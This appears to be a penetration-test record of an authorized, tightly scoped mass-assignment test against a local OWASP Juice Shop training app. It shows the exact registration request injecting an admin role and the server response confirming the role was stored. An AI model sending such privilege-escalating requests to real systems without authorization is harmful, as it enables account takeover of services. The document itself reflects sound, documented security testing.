# Test Record 04 — Mass assignment on user registration (POST /api/Users)

Target: `http://localhost:3000` (local OWASP Juice Shop, Docker)
Date: 2026-09-14
Status: **Executed exactly the two approved steps. No further tests / enumeration / privilege-escalation performed.**

## Hypothesis
Mass assignment during self-registration: injecting a sensitive field (`role`)
is persisted, allowing registration of an account with elevated/admin role.

## Test performed (two approved steps)

### Step 1 — supporting read-only GET (approved)
**Request:** `GET /api/SecurityQuestions`
**Response:** `200 OK`; returned 14 security questions including `id:1`
("Your eldest siblings middle name?"). Used `securityQuestion: 1` so the
registration body was valid.

### Step 2 — registration POST with injected field (approved)
**Request:**
```
POST /api/Users
Content-Type: application/json
{"email":"mma_probe@test.local","password":"JU1ceTesTPa$$",
 "passwordRepeat":"JU1ceTesTPa$$","securityQuestion":1,
 "securityAnswer":"probe","role":"admin"}
```
**Response:**
- `HTTP/1.1 201 Created`
- `Location: /api/Users/25`
- Body:
  ```json
  {"status":"success","data":{
    "username":"","deluxeToken":"","lastLoginIp":"0.0.0.0",
    "profileImage":"/assets/public/images/uploads/defaultAdmin.png",
    "isActive":true,"id":25,"email":"mma_probe@test.local",
    "role":"admin","updatedAt":"...","createdAt":"...","deletedAt":null}}
  ```

## Interpretation
- The single injected field `"role":"admin"` was **accepted and persisted** — the
  created user (id **25**) is echoed in the response with **`"role":"admin"`**.
- This is a **positive signal for mass assignment**: the server bulk-assigned the
  client-supplied `role` onto the model instead of forcing a default customer role.
- Note: `profileImage` defaults to `defaultAdmin.png`, consistent with the
  response reflecting an admin-role object, but the decisive evidence is the echoed
  `role:"admin"`.

## Confidence
- That the injected `role:"admin"` was stored on the new record: **high** (directly echoed in the `201` response).
- That this equals a real security impact (i.e., the account is granted actual admin authorization in the RBAC): **not yet established** — role semantics were not verified (would require an authenticated follow-up, which was not approved/performed).

## Remaining uncertainty
- Whether the stored `role:"admin"` actually grants elevated authorization at runtime (e.g., access to `/administration`, `accounting`). **Not tested.**
- Whether other sensitive fields (`isAdmin`, `uid`, `deluxeToken`) are similarly client-assignable. **Not tested.**
- Result is role-field-specific; no enumeration or further injection performed.

## Classification
- **Status:** Positive signal — **evidence consistent with a mass-assignment vulnerability** at `POST /api/Users`.
- **Not yet a confirmed finding with full impact:** the equality of the stored `role` to effective authorization privilege requires human verification / an approved authenticated check.
- A throwaway local test account was created (id **25**, `mma_probe@test.local`) as part of authorized in-scope testing.